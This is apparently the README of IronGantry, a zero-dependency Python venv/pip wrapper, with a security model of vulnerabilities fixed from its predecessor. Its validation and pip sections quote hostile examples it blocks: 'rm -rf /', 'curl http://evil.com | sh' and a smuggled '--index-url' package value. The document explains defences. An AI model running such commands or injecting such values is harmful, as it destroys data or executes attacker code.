# IronGantry

A security-hardened Python container engine with zero external dependencies. IronGantry wraps Python's built-in `venv` and `pip` behind a Docker-like CLI, letting you initialize, build, run, and ship Python projects from a single manifest file.

IronGantry is a ground-up rewrite of [Pygantry](https://github.com/erabytse/Pygantry), replacing all external dependencies with Python standard library equivalents and fixing every known security vulnerability in the original codebase.

## Requirements

- **Python 3.11 or later** (uses `tomllib`, added in 3.11)
- No external packages. The dependency list is empty — literally `dependencies = []`.

## Quick Start

All commands are run from **your project directory** — the folder where your Python source files live (e.g. `main.py`). IronGantry itself can live anywhere; you just need to reference its `irongantry.py` entry point when running IronGantry commands from the command line.

### 1. Initialize

```
cd C:\Users\you\projects\myproject
python C:\path\to\IronGantry\irongantry.py init myproject
```

This creates one file in your project directory:

```
myproject/
  main.py              <-- your code (already here)
  IronGantryfile       <-- created by init
```

The `IronGantryfile` is a TOML manifest:

```toml
project = "myproject"
python = "3.11"
packages = []
entrypoint = "python main.py"
```

### 2. Configure

Edit `IronGantryfile` to add any pip packages your project needs:

```toml
packages = ["requests>=2.31", "flask>=3.0"]
```

### 3. Build

```
python C:\path\to\IronGantry\irongantry.py build
```

This creates a `.irongantry_env/` virtual environment directory inside your project folder and installs all listed packages into it:

```
myproject/
  main.py
  IronGantryfile
  .irongantry_env/     <-- created by build (venv + installed packages)
```

### 4. Run

```
python C:\path\to\IronGantry\irongantry.py run
```

Executes the `entrypoint` from your manifest using the Python interpreter inside `.irongantry_env/`. No need to activate the venv yourself.

### 5. Ship

```
python C:\path\to\IronGantry\irongantry.py ship
```

Creates a portable `myproject_shipped.zip` that anyone can run with only Python 3.11+ installed. The zip bundles your source files, the IronGantry tool itself, and a `bootstrap.py` script — but excludes the virtual environment, caches, and compiled bytecode.

```
myproject_shipped.zip
  IronGantryfile
  main.py                  (your source files)
  irongantry.py            (bundled entry point)
  irongantry/              (bundled IronGantry package)
    __init__.py
    validate.py
    engine.py
    cli.py
  bootstrap.py             (generated — runs build + run)
```

The recipient extracts the zip and runs one command:

```
unzip myproject_shipped.zip -d myproject
cd myproject
python bootstrap.py
```

`bootstrap.py` calls `irongantry.py build` (creates a fresh venv and installs packages) then `irongantry.py run` (executes the entrypoint). No need to install IronGantry separately.

## Installation

### Run directly (no install needed)

Clone or copy the project, then run commands with:

```
python irongantry.py <command>
```

### Install as a package

```
pip install .
```

After installation, the `irongantry` command is available globally:

```
irongantry <command>
```

## Usage with Claude Code

IronGantry apps work as self-contained CLI tools that [Claude Code](https://claude.com/claude-code) can invoke directly. Because each app carries its own virtual environment with dependencies already installed, Claude Code can run them without installing anything into the system Python.

### Example: portscout

[portscout](https://github.com/erabytse/portscout) is a cross-platform port/process CLI tool built with IronGantry. It uses `psutil` to replace platform-specific commands like `netstat`, `lsof`, and `taskkill` with a single interface.

**Project structure:**

```
portscout/
  IronGantryfile       # manifest: project name, psutil dependency, entrypoint
  main.py              # the tool (argparse CLI with listen/port/kill/find)
  portscout.cmd         # wrapper that finds the venv Python and forwards args
```

**First-time setup (once):**

```
cd C:\Users\you\projects\portscout
python C:\path\to\IronGantry\irongantry.py build
```

**The wrapper script** (`portscout.cmd` on Windows) locates the `.irongantry_env` Python and forwards arguments to `main.py`, so callers never need to activate the venv:

```bat
@echo off
py -3.11 "%~dp0portscout.py" %*
```

Where `portscout.py` is a thin Python script that resolves the venv Python path cross-platform (`Scripts/python.exe` on Windows, `bin/python` on Unix) and runs `main.py` via `subprocess.run`.

**Daily use from Claude Code:**

```
portscout.cmd listen          # list all listening ports
portscout.cmd port 8080       # detail on a specific port
portscout.cmd kill 3000       # terminate process on a port
portscout.cmd find node       # find processes by name
```

To make this available to Claude Code, add the tool to your `CLAUDE.md`:

```markdown
## CLI Tools

### portscout — port/process lookup
When you need to check what's on a port, find a process, or kill a stuck dev server,
use portscout instead of platform-specific commands like netstat, lsof, or taskkill.

Invoke via: `C:\Users\you\projects\portscout\portscout.cmd`
```

This pattern — **IronGantryfile + main script + wrapper** — works for any IronGantry app you want to expose as a CLI tool. The app is fully isolated: its dependencies live in `.irongantry_env/`, not in the system Python, so there are no conflicts and no activation step.

## Commands

### `version`

Print the current IronGantry version.

```
$ python irongantry.py version
IronGantry v1.0.0
```

### `init [name]`

Create a new `IronGantryfile` in the current directory.

| Argument | Default | Description |
|----------|---------|-------------|
| `name` | `my_app` | Project name. Must contain only letters, digits, underscores, or hyphens. |

```
$ python irongantry.py init my_api
Created IronGantryfile for project 'my_api'.
```

If an `IronGantryfile` already exists, the command refuses to overwrite it and exits with an error. Delete the existing file first if you want to reinitialize.

```
$ python irongantry.py init my_api
Error: IronGantryfile already exists. Remove it first if you want to reinitialize.
```

### `build`

Create a virtual environment in `.irongantry_env/` and install all packages listed in the manifest.

```
$ python irongantry.py build
Creating virtual environment...
Installing 2 package(s)...
Build complete.
```

If `.irongantry_env/` already exists, it is deleted and rebuilt from scratch. The virtual environment is created with `with_pip=True` and `symlinks=False` (hard copies, for Windows compatibility).

Packages are installed via pip using `shell=False` and the `--` separator to prevent package names from being interpreted as pip flags.

### `run`

Execute the entrypoint defined in the manifest using the Python interpreter inside the virtual environment.

```
$ python irongantry.py run
```

The engine:

1. Parses the entrypoint with `shlex.split()` into a token list
2. Replaces the first token (`python` or `python3`) with the absolute path to the venv Python
3. Sets `VIRTUAL_ENV` and prepends the venv `bin`/`Scripts` directory to `PATH`
4. Executes with `subprocess.run(tokens, shell=False)`

The process inherits the current environment with the venv additions. If the venv doesn't exist, you'll get a clear error telling you to run `build` first.

### `ship`

Package the project into a portable ZIP archive named `<project>_shipped.zip`.

```
$ python irongantry.py ship
Shipped: my_api_shipped.zip
```

The zip is built selectively with `zipfile.ZipFile`:

- **Included**: all user source files, `IronGantryfile`
- **Bundled**: the `irongantry/` package and `irongantry.py` entry point (copied from the running IronGantry installation so the recipient has the tool)
- **Generated**: a `bootstrap.py` that runs `build` then `run`
- **Excluded**: `.irongantry_env/`, `__pycache__/`, `*.pyc`, `*.pyo`, any existing `*_shipped.zip`, dot-directories

The recipient only needs Python 3.11+ — no IronGantry installation required. After extracting, `python bootstrap.py` creates a fresh virtual environment, installs packages, and runs the entrypoint.

## Manifest Format

The manifest file is named `IronGantryfile` and uses TOML syntax, parsed by Python's built-in `tomllib` module.

```toml
project = "my_api"
python = "3.12"
packages = ["requests>=2.31", "flask>=3.0"]
entrypoint = "python main.py"
```

### Fields

| Field | Required | Type | Description |
|-------|----------|------|-------------|
| `project` | Yes | String | Project name. Only letters, digits, underscores, and hyphens (`^[A-Za-z0-9_-]+$`). |
| `entrypoint` | Yes | String | Command to execute on `run`. Must start with `python` or `python3`. |
| `python` | No | String | Python version in `major.minor` format (e.g. `"3.12"`). Informational only. |
| `packages` | No | Array of strings | Pip package specifiers. Each is validated against PEP 508 naming rules. |

### Validation Rules

Every field is validated when the manifest is loaded. The engine will refuse to proceed if any rule is violated.

- **Unknown keys are rejected.** Only `project`, `python`, `packages`, and `entrypoint` are accepted. A typo like `packges` will produce an error, not a silent ignore.
- **Project name** must match `^[A-Za-z0-9_-]+$`. Names like `my_app` and `cool-project-2` are valid. Names with spaces, dots, or special characters are rejected.
- **Entrypoint** is split into tokens and the first token must be exactly `python` or `python3`. This prevents arbitrary command execution — you cannot set the entrypoint to `rm -rf /` or `curl http://evil.com | sh`.
- **Python version** must be `major.minor` format: one or more digits, a dot, one or more digits. Strings like `3.12` pass; strings like `3`, `3.12.1`, or `latest` are rejected.
- **Package specifiers** are validated against a PEP 508 regex that accepts:
  - Simple names: `requests`, `flask`
  - Names with dots, hyphens, underscores: `my-package`, `zope.interface`
  - Extras: `requests[security]`, `package[extra1,extra2]`
  - Version constraints: `requests>=2.31`, `flask>=3.0,<4`, `numpy~=1.26`
  - Invalid names (starting with `-`, containing shell metacharacters, etc.) are rejected.

## Project Structure

```
IronGantry/
  irongantry.py              Entry point script
  irongantry/
    __init__.py               Version constant ("1.0.0")
    validate.py               Input validation (packages, manifest, entrypoint)
    engine.py                 Core engine (init, build, run, ship)
    cli.py                    argparse CLI
  pyproject.toml              Project metadata, zero dependencies
  .gitignore                  Ignores .irongantry_env/, __pycache__/, etc.
  LICENSE                     MIT
```

### Module Responsibilities

**`validate.py`** contains all input validation logic and has no internal dependencies. Every piece of user-supplied data — project names, package specifiers, entrypoints, python versions, and the manifest as a whole — is validated here. This module can be tested in isolation.

Five public functions are exposed:

- `validate_project_name(name)` — checks name against `^[A-Za-z0-9_-]+$`
- `validate_package(pkg)` — checks package specifier against PEP 508 regex
- `validate_entrypoint(entry)` — checks first token is `python` or `python3`
- `validate_python_version(ver)` — checks `major.minor` format
- `validate_manifest(config)` — validates the full manifest dict (calls all of the above, rejects unknown keys, enforces required fields)

**`engine.py`** contains the `IronGantryEngine` class with four public methods (`init`, `build`, `run`, `ship`) and private helpers for cross-platform path resolution. It imports `validate_manifest` and `validate_project_name` from `validate.py`. TOML parsing uses `tomllib` from the standard library.

**`cli.py`** defines the `main()` function which sets up an `argparse` parser with five subcommands. Each subcommand handler instantiates a fresh `IronGantryEngine` (not shared at module level) and calls the corresponding engine method. Errors (`FileNotFoundError`, `FileExistsError`, `ValueError`) are caught and printed to stderr with a non-zero exit code.

**`irongantry.py`** is a two-line entry point that imports and calls `main()` from `cli.py`.

## Security Model

IronGantry was written to fix ten specific security vulnerabilities found in Pygantry. Here is what was wrong and how each issue is addressed.

### 1. Command Injection via `shell=True`

**Pygantry** passed user-controlled strings to `subprocess.run()` with `shell=True`, allowing shell metacharacters in entrypoints or package names to execute arbitrary commands.

**IronGantry** uses `shell=False` everywhere. Commands are passed as argument lists (Python lists of strings), never as shell-interpreted strings. Entrypoints are parsed with `shlex.split()` into tokens before execution.

### 2. `os.system()` for File Attribute Manipulation

**Pygantry** used `os.system(f'attrib +h ...')` in a `stealth` command to hide the venv folder on Windows. `os.system()` passes strings directly to the system shell.

**IronGantry** removes the `stealth` command entirely. There is no `os.system()` call anywhere in the codebase.

### 3. `sys.path` Manipulation

**Pygantry** called `sys.path.append(os.getcwd())` at import time in the entry point, which could allow loading of arbitrary Python modules from the current directory.

**IronGantry** does not modify `sys.path`. The entry point is a clean import of the CLI module.

### 4. Duplicate Command Definitions

**Pygantry** defined two `init` functions in `cli.py`, where the second silently overwrote the first. This caused confusion about which signature was active.

**IronGantry** has a single `init` command with an optional `name` argument (defaults to `"my_app"`).

### 5. Unvalidated Pip Packages

**Pygantry** passed user-supplied package names directly to pip with no validation. A malicious package name like `--index-url=http://evil.com/simple/ evil-pkg` could redirect pip to a hostile package index.

**IronGantry** validates every package name against a PEP 508 regex before passing it to pip. Additionally, the `--` separator is placed before the package list in the pip command, so even if validation were bypassed, package names cannot be interpreted as pip flags.

### 6. Unsafe Entrypoint String Replacement

**Pygantry** used `entry.replace("python", abs_python, 1)`, which is a substring match. An entrypoint like `python pythonic_app.py` would have `python` replaced inside the filename, producing a broken command.

**IronGantry** uses `shlex.split()` to tokenize the entrypoint, then replaces only `tokens[0]` (the first token) with the venv Python path. This is an exact token replacement, not a substring match.

### 7. No Manifest Validation

**Pygantry** loaded the YAML manifest and used values directly with no schema validation. Typos in key names were silently ignored, and malformed values could cause unexpected behavior.

**IronGantry** validates every field and rejects unknown keys. The full schema is enforced in `validate.py` before any engine operation proceeds.

### 8. Unvalidated File Writes (`founder.key`)

**Pygantry** wrote user-supplied activation keys to `founder.key` with no validation.

**IronGantry** removes the entire founder/premium feature set. There are no license files, no activation commands, no premium-gated features.

### 9. Silent Manifest Overwrite

**Pygantry** would silently overwrite an existing `Gantryfile` when `init` was run again, potentially destroying a user's configuration.

**IronGantry** raises `FileExistsError` if `IronGantryfile` already exists when `init` is called.

### 10. Module-Level Engine Instantiation

**Pygantry** created a shared `PyGantryEngine()` instance at module import time in `cli.py`. This means the engine was constructed as a side effect of importing the module, regardless of which command was being run.

**IronGantry** instantiates `IronGantryEngine` inside each command handler function. The engine is only created when a command is actually dispatched.

## Removed Features

The following Pygantry commands and features have been removed entirely:

| Feature | Reason |
|---------|--------|
| `activate` | Founder/premium licensing system removed |
| `founder_debug` | Premium-only debug command removed |
| `founder_clean` | Premium-only cleanup command removed |
| `founder_stats` | Premium-only stats command removed |
| `stealth` | Used `os.system()` for `attrib +h`; unnecessary feature |
| `founder.key` | License key file; entire premium system removed |
| `utils.py` | Contained a single unused `log_success()` function that depended on `rich` |

## Dependency Comparison

| Component | Pygantry | IronGantry |
|-----------|----------|------------|
| CLI framework | `typer>=0.9.0` | `argparse` (stdlib) |
| Formatted output | `rich>=13.0.0` | `print()` (stdlib) |
| Manifest parsing | `pyyaml>=6.0.1` | `tomllib` (stdlib, Python 3.11+) |
| Manifest format | YAML (`Gantryfile`) | TOML (`IronGantryfile`) |
| Shipping | Zips entire directory including venv (not portable) | Portable zip with bundled tool and `bootstrap.py` (recipient needs only Python 3.11+) |
| Total external dependencies | 3 | 0 |

## Cross-Platform Support

IronGantry detects Windows vs. Unix and adjusts paths accordingly:

| Detail | Windows (`os.name == "nt"`) | Unix/macOS |
|--------|----------------------------|------------|
| Venv binaries directory | `.irongantry_env/Scripts/` | `.irongantry_env/bin/` |
| Python executable | `python.exe` | `python` |
| Pip executable | `pip.exe` | `pip` |
| Venv symlinks | Disabled (`symlinks=False`) | Disabled (`symlinks=False`) |

## License

MIT. See [LICENSE](LICENSE).
